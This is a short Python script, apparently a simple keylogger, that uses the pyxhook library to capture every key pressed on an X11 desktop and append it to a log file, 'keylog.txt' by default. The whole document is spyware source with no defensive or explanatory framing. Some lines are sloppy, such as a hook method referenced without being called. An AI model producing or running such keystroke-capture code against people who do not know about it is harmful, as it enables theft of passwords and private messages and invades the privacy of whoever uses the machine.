import pyxhook, sys

if len(sys.argv) > 1:
	logfile = sys.argv[1]
else:
	logfile = input("DEFAULT VALUE: 'keylog.txt' ") or 'keylog.txt'

def key_press(event):
	try:
		klog = open(logfile, 'a+')
		klog.write(event.Key)
		klog.write("\n")

	except KeyboardInterrupt:
		klog.close()
		sys.exit()

hook = pyxhook.HookManager()
hook.KeyDown=key_press
hook.HookKeyboard
hook.start()
